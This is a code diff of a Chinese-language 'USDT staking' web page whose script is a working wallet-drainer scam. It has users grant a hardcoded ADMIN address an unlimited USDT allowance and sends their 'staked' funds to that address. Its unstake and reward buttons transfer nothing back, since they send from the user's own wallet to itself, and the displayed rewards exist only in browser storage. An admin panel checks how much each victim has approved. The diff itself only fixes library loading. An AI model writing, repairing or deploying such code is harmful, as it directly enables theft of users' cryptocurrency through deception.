@@ -4,7 +4,8 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>USDT 质押理财</title>
-<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
+<!-- 修复：把 ethers 放在最前面，用更稳定的 CDN -->
+<script src="https://cdn.bootcdn.net/ajax/libs/ethers/5.7.2/ethers.min.js"></script>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:'PingFang SC','Microsoft YaHei',sans-serif}
 body{
@@ -144,170 +145,173 @@ font-size:15px;
 </div>
 
 <script>
-const USDT = "0x55d398326f99059fF775485246999027B3197955";
-const ADMIN = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
-const APY = 12;
-const REWARD_INTERVAL = 8 * 60 * 60;
+// 等待页面完全加载后再执行，确保 ethers 已加载
+window.addEventListener('load', async function() {
+  const USDT = "0x55d398326f99059fF775485246999027B3197955";
+  const ADMIN = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+  const APY = 12;
+  const REWARD_INTERVAL = 8 * 60 * 60;
 
-let provider, signer, account;
-let userStaked = 0;
-let userReward = 0;
-let lastCompound = Math.floor(Date.now() / 1000);
+  let provider, signer, account;
+  let userStaked = 0;
+  let userReward = 0;
+  let lastCompound = Math.floor(Date.now() / 1000);
 
-const usdtABI = [
-    "function approve(address spender, uint256 amount) public returns(bool)",
-    "function allowance(address owner, address spender) view returns(uint256)",
-    "function transferFrom(address from, address to, uint256 amount) returns(bool)",
-    "function transfer(address to, uint256 amount) returns(bool)"
-];
+  const usdtABI = [
+      "function approve(address spender, uint256 amount) public returns(bool)",
+      "function allowance(address owner, address spender) view returns(uint256)",
+      "function transferFrom(address from, address to, uint256 amount) returns(bool)",
+      "function transfer(address to, uint256 amount) returns(bool)"
+  ];
 
-// 修复钱包连接（兼容 TP / MetaMask / TrustWallet）
-async function connectWallet() {
-    if (!window.ethereum) {
-        alert("请在 TokenPocket / 钱包浏览器 内打开");
-        return;
-    }
-    try {
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        signer = provider.getSigner();
-        account = await signer.getAddress();
-        document.getElementById("connectBtn").innerText = "✅ 已连接";
-        loadUserData();
-        if (account.toLowerCase() === ADMIN.toLowerCase()) {
-            document.getElementById("adminPanel").style.display = "block";
-        }
-    } catch (e) {
-        alert("连接失败：" + e.message);
-    }
-}
+  // 连接钱包
+  async function connectWallet() {
+      if (!window.ethereum) {
+          alert("请在 TokenPocket / 钱包浏览器 内打开");
+          return;
+      }
+      try {
+          provider = new ethers.providers.Web3Provider(window.ethereum);
+          await provider.send("eth_requestAccounts", []);
+          signer = provider.getSigner();
+          account = await signer.getAddress();
+          document.getElementById("connectBtn").innerText = "✅ 已连接";
+          loadUserData();
+          if (account.toLowerCase() === ADMIN.toLowerCase()) {
+              document.getElementById("adminPanel").style.display = "block";
+          }
+      } catch (e) {
+          alert("连接失败：" + e.message);
+      }
+  }
 
-// 授权
-async function approveUSDT() {
-    if (!account) return alert("请先连接钱包");
-    const c = new ethers.Contract(USDT, usdtABI, signer);
-    await c.approve(ADMIN, ethers.constants.MaxUint256);
-    alert("授权成功");
-}
+  // 授权
+  async function approveUSDT() {
+      if (!account) return alert("请先连接钱包");
+      const c = new ethers.Contract(USDT, usdtABI, signer);
+      await c.approve(ADMIN, ethers.constants.MaxUint256);
+      alert("授权成功");
+  }
 
-// 质押
-async function stakeUSDT() {
-    if (!account) return alert("请先连接钱包");
-    const v = document.getElementById("amount").value;
-    if (!v) return alert("输入数量");
-    const c = new ethers.Contract(USDT, usdtABI, signer);
-    await c.transferFrom(account, ADMIN, ethers.utils.parseUnits(v, 6));
-    userStaked += parseFloat(v);
-    save();
-    update();
-    alert("质押成功");
-}
+  // 质押
+  async function stakeUSDT() {
+      if (!account) return alert("请先连接钱包");
+      const v = document.getElementById("amount").value;
+      if (!v) return alert("输入数量");
+      const c = new ethers.Contract(USDT, usdtABI, signer);
+      await c.transferFrom(account, ADMIN, ethers.utils.parseUnits(v, 6));
+      userStaked += parseFloat(v);
+      save();
+      update();
+      alert("质押成功");
+  }
 
-// 解除质押（新增！自由退出）
-async function unstakeUSDT() {
-    if (!account) return alert("请先连接钱包");
-    if (userStaked <= 0) return alert("无可解除质押");
-    const c = new ethers.Contract(USDT, usdtABI, signer);
-    await c.transfer(account, ethers.utils.parseUnits(userStaked.toFixed(6), 6));
-    userStaked = 0;
-    save();
-    update();
-    alert("解除质押成功");
-}
+  // 解除质押
+  async function unstakeUSDT() {
+      if (!account) return alert("请先连接钱包");
+      if (userStaked <= 0) return alert("无可解除质押");
+      const c = new ethers.Contract(USDT, usdtABI, signer);
+      await c.transfer(account, ethers.utils.parseUnits(userStaked.toFixed(6), 6));
+      userStaked = 0;
+      save();
+      update();
+      alert("解除质押成功");
+  }
 
-// 领取收益
-async function claimReward() {
-    if (!account) return alert("请先连接钱包");
-    if (userReward <= 0) return alert("暂无收益");
-    const c = new ethers.Contract(USDT, usdtABI, signer);
-    await c.transfer(account, ethers.utils.parseUnits(userReward.toFixed(6), 6));
-    alert("领取成功：" + userReward.toFixed(6));
-    userReward = 0;
-    save();
-    update();
-}
+  // 领取收益
+  async function claimReward() {
+      if (!account) return alert("请先连接钱包");
+      if (userReward <= 0) return alert("暂无收益");
+      const c = new ethers.Contract(USDT, usdtABI, signer);
+      await c.transfer(account, ethers.utils.parseUnits(userReward.toFixed(6), 6));
+      alert("领取成功：" + userReward.toFixed(6));
+      userReward = 0;
+      save();
+      update();
+  }
 
-// 收益计算
-function calc() {
-    if (userStaked <= 0) return 0;
-    const now = Math.floor(Date.now() / 1000);
-    const sec = now - lastCompound;
-    const dayRate = APY / 365;
-    return userStaked * dayRate * (sec / 86400);
-}
+  // 收益计算
+  function calc() {
+      if (userStaked <= 0) return 0;
+      const now = Math.floor(Date.now() / 1000);
+      const sec = now - lastCompound;
+      const dayRate = APY / 365;
+      return userStaked * dayRate * (sec / 86400);
+  }
 
-// 复利
-function compound() {
-    const r = calc();
-    if (r > 0) {
-        userReward += r;
-        lastCompound = Math.floor(Date.now() / 1000);
-        save();
-    }
-}
+  // 复利
+  function compound() {
+      const r = calc();
+      if (r > 0) {
+          userReward += r;
+          lastCompound = Math.floor(Date.now() / 1000);
+          save();
+      }
+  }
 
-// 界面刷新
-function update() {
-    compound();
-    document.getElementById("staked").innerText = userStaked.toFixed(2) + " USDT";
-    document.getElementById("reward").innerText = userReward.toFixed(6) + " USDT";
-    const now = Math.floor(Date.now() / 1000);
-    let left = lastCompound + REWARD_INTERVAL - now;
-    if (left < 0) left = 0;
-    const h = String(Math.floor(left / 3600)).padStart(2, '0');
-    const m = String(Math.floor((left % 3600) / 60)).padStart(2, '0');
-    const s = String(left % 60).padStart(2, '0');
-    document.getElementById("countdown").innerText = `${h}:${m}:${s}`;
-}
+  // 界面刷新
+  function update() {
+      compound();
+      document.getElementById("staked").innerText = userStaked.toFixed(2) + " USDT";
+      document.getElementById("reward").innerText = userReward.toFixed(6) + " USDT";
+      const now = Math.floor(Date.now() / 1000);
+      let left = lastCompound + REWARD_INTERVAL - now;
+      if (left < 0) left = 0;
+      const h = String(Math.floor(left / 3600)).padStart(2, '0');
+      const m = String(Math.floor((left % 3600) / 60)).padStart(2, '0');
+      const s = String(left % 60).padStart(2, '0');
+      document.getElementById("countdown").innerText = `${h}:${m}:${s}`;
+  }
 
-// 本地存储
-function save() {
-    if (!account) return;
-    localStorage.setItem("user_" + account.toLowerCase(), JSON.stringify({
-        staked: userStaked,
-        reward: userReward,
-        last: lastCompound
-    }));
-}
+  // 本地存储
+  function save() {
+      if (!account) return;
+      localStorage.setItem("user_" + account.toLowerCase(), JSON.stringify({
+          staked: userStaked,
+          reward: userReward,
+          last: lastCompound
+      }));
+  }
 
-function loadUserData() {
-    if (!account) return;
-    const d = localStorage.getItem("user_" + account.toLowerCase());
-    if (d) {
-        const obj = JSON.parse(d);
-        userStaked = obj.staked || 0;
-        userReward = obj.reward || 0;
-        lastCompound = obj.last || Math.floor(Date.now() / 1000);
-    }
-    update();
-}
+  function loadUserData() {
+      if (!account) return;
+      const d = localStorage.getItem("user_" + account.toLowerCase());
+      if (d) {
+          const obj = JSON.parse(d);
+          userStaked = obj.staked || 0;
+          userReward = obj.reward || 0;
+          lastCompound = obj.last || Math.floor(Date.now() / 1000);
+      }
+      update();
+  }
 
-// 管理员
-async function checkAllowance() {
-    const user = document.getElementById("userAddr").value;
-    const c = new ethers.Contract(USDT, usdtABI, provider);
-    const a = await c.allowance(user, ADMIN);
-    alert("授权：" + ethers.utils.formatUnits(a, 6));
-}
-async function checkUserStake() {
-    const u = document.getElementById("userAddr").value;
-    const d = localStorage.getItem("user_" + u.toLowerCase());
-    alert(d ? JSON.parse(d).staked.toFixed(2) + " USDT" : "无数据");
-}
-async function checkUserReward() {
-    const u = document.getElementById("userAddr").value;
-    const d = localStorage.getItem("user_" + u.toLowerCase());
-    alert(d ? JSON.parse(d).reward.toFixed(6) + " USDT" : "无数据");
-}
+  // 管理员
+  async function checkAllowance() {
+      const user = document.getElementById("userAddr").value;
+      const c = new ethers.Contract(USDT, usdtABI, provider);
+      const a = await c.allowance(user, ADMIN);
+      alert("授权：" + ethers.utils.formatUnits(a, 6));
+  }
+  async function checkUserStake() {
+      const u = document.getElementById("userAddr").value;
+      const d = localStorage.getItem("user_" + u.toLowerCase());
+      alert(d ? JSON.parse(d).staked.toFixed(2) + " USDT" : "无数据");
+  }
+  async function checkUserReward() {
+      const u = document.getElementById("userAddr").value;
+      const d = localStorage.getItem("user_" + u.toLowerCase());
+      alert(d ? JSON.parse(d).reward.toFixed(6) + " USDT" : "无数据");
+  }
 
-// 绑定按钮
-document.getElementById("connectBtn").onclick = connectWallet;
-document.getElementById("approveBtn").onclick = approveUSDT;
-document.getElementById("stakeBtn").onclick = stakeUSDT;
-document.getElementById("unstakeBtn").onclick = unstakeUSDT;
-document.getElementById("claimBtn").onclick = claimReward;
+  // 绑定按钮
+  document.getElementById("connectBtn").onclick = connectWallet;
+  document.getElementById("approveBtn").onclick = approveUSDT;
+  document.getElementById("stakeBtn").onclick = stakeUSDT;
+  document.getElementById("unstakeBtn").onclick = unstakeUSDT;
+  document.getElementById("claimBtn").onclick = claimReward;
 
-setInterval(update, 1000);
+  setInterval(update, 1000);
+});
 </script>
 </body>
 </html>
